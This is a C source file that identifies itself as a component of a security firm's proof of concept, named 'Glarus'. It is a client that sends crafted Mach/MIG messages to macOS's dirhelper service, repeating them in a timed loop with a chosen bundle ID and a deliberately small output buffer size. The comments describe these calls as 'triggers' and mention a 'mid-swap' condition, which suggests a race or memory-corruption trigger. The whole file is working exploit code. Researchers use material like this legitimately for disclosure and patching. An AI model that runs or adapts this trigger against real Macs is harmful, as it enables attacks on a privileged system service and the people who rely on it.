/*
 * dirhelper_client.c - Glarus PoC Component (Persistent Trigger)
 * 
 * Instead of spawning a new process for each trigger,
 * this version loops internally. This means:
 *   - Sandbox initializes ONCE at startup
 *   - Makes N MIG calls in a loop
 *   - No more crashes from mid-swap sandbox init
 * 
 * Usage:
 *   ./DirhelperClient <bundle_id> <type> <buffer_size> [count] [delay_us]
 * 
 * Examples:
 *   ./DirhelperClient com.glarus.poc 1 57           # Single trigger
 *   ./DirhelperClient com.glarus.poc 1 57 5000 100  # 5000 triggers, 100μs apart
 * 
 * Copyright (c) 2025 Golden Helm Securities
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <pwd.h>
#include <mach/mach.h>
#include <mach/mig.h>
#include <servers/bootstrap.h>

#define DIRHELPER_MIG_ID          0xB872
#define DIRHELPER_SERVICE_NAME    "com.apple.bsd.dirhelper"
#define DIRHELPER_TYPE_CONTAINER  1
#define DIRHELPER_TYPE_CACHE      2
#define DEFAULT_BUFFER_SIZE       1024
#define ALIGN4(x)                 (((x) + 3) & ~3)

static volatile int g_running = 1;

typedef struct {
    mach_msg_header_t header;
    uint32_t ndr_word1;
    uint32_t ndr_word2;
    uint32_t type;
    uint32_t flags;
    uint32_t pad;
    uint32_t path_length;
} dirhelper_request_base_t;

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    uint32_t ndr_word1;
    uint32_t ndr_word2;
    uint32_t return_code;
    uint32_t path_offset;
    char path_data[2048];
} dirhelper_reply_t;

static void signal_handler(int sig) {
    (void)sig;
    g_running = 0;
}

static void print_error(const char *msg, kern_return_t kr) {
    fprintf(stderr, "ERROR: %s: %s (0x%x)\n", msg, mach_error_string(kr), kr);
}

/*
 * Make a single MIG call to dirhelper
 */
static int call_dirhelper_once(mach_port_t service_port, const char *bundle_id, 
                                int type, uint32_t output_buffer_size) {
    kern_return_t kr;
    mach_port_t reply_port = MACH_PORT_NULL;
    void *msg_buffer = NULL;
    void *reply_buffer = NULL;
    int result = 1;
    
    reply_port = mig_get_reply_port();
    if (reply_port == MACH_PORT_NULL) {
        return -1;
    }
    
    size_t path_len = strlen(bundle_id) + 1;
    size_t path_len_padded = ALIGN4(path_len);
    size_t msg_size = sizeof(dirhelper_request_base_t) + path_len_padded + sizeof(uint32_t);
    
    msg_buffer = calloc(1, msg_size);
    if (!msg_buffer) goto cleanup;
    
    mach_msg_header_t *header = (mach_msg_header_t *)msg_buffer;
    header->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    header->msgh_size = (mach_msg_size_t)msg_size;
    header->msgh_remote_port = service_port;
    header->msgh_local_port = reply_port;
    header->msgh_voucher_port = MACH_PORT_NULL;
    header->msgh_id = DIRHELPER_MIG_ID;
    
    dirhelper_request_base_t *req = (dirhelper_request_base_t *)msg_buffer;
    req->ndr_word1 = 0x00000000;
    req->ndr_word2 = 0x00000001;
    req->type = type;
    req->flags = 1;
    req->pad = 0;
    req->path_length = (uint32_t)path_len;
    
    char *path_ptr = (char *)msg_buffer + sizeof(dirhelper_request_base_t);
    memcpy(path_ptr, bundle_id, path_len);
    
    uint32_t *out_buf_size_ptr = (uint32_t *)(path_ptr + path_len_padded);
    *out_buf_size_ptr = output_buffer_size;
    
    size_t reply_size = sizeof(dirhelper_reply_t);
    reply_buffer = calloc(1, reply_size);
    if (!reply_buffer) goto cleanup;
    
    kr = mach_msg((mach_msg_header_t *)msg_buffer, MACH_SEND_MSG,
                  (mach_msg_size_t)msg_size, 0, MACH_PORT_NULL,
                  MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    
    if (kr != KERN_SUCCESS) {
        print_error("mach_msg (send)", kr);
        goto cleanup;
    }
    
    kr = mach_msg((mach_msg_header_t *)reply_buffer, MACH_RCV_MSG,
                  0, (mach_msg_size_t)reply_size, reply_port,
                  MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    
    if (kr != KERN_SUCCESS) {
        print_error("mach_msg (receive)", kr);
        goto cleanup;
    }
    
    result = 0;
    
cleanup:
    if (msg_buffer) free(msg_buffer);
    if (reply_buffer) {
        mach_msg_destroy((mach_msg_header_t *)reply_buffer);
        free(reply_buffer);
    }
    
    return result;
}

int main(int argc, char *argv[]) {
    const char *bundle_id = "com.glarus.poc";
    int type = DIRHELPER_TYPE_CONTAINER;
    uint32_t buffer_size = DEFAULT_BUFFER_SIZE;
    int count = 1;
    int delay_us = 1000;  /* 1ms default delay between triggers */
    
    if (argc > 1) bundle_id = argv[1];
    if (argc > 2) type = atoi(argv[2]);
    if (argc > 3) buffer_size = (uint32_t)atoi(argv[3]);
    if (argc > 4) count = atoi(argv[4]);
    if (argc > 5) delay_us = atoi(argv[5]);
    
    /* Setup signal handler for clean shutdown */
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGUSR1, signal_handler);  /* Can be used to stop early */
    
    /* Look up dirhelper service ONCE */
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t kr = bootstrap_look_up(bootstrap_port, DIRHELPER_SERVICE_NAME, &service_port);
    if (kr != KERN_SUCCESS) {
        print_error("bootstrap_look_up", kr);
        return 1;
    }
    
    /* Signal ready by printing to stdout (parent can wait for this) */
    printf("READY\n");
    fflush(stdout);
    
    /* Main trigger loop */
    int successes = 0;
    int failures = 0;
    
    for (int i = 0; i < count && g_running; i++) {
        if (call_dirhelper_once(service_port, bundle_id, type, buffer_size) == 0) {
            successes++;
        } else {
            failures++;
        }
        
        /* Delay between triggers */
        if (delay_us > 0 && i < count - 1) {
            usleep(delay_us);
        }
    }
    
    /* Signal completion */
    printf("DONE triggers=%d successes=%d failures=%d\n", count, successes, failures);
    fflush(stdout);
    
    mach_port_deallocate(mach_task_self(), service_port);
    
    return (failures > 0) ? 1 : 0;
}
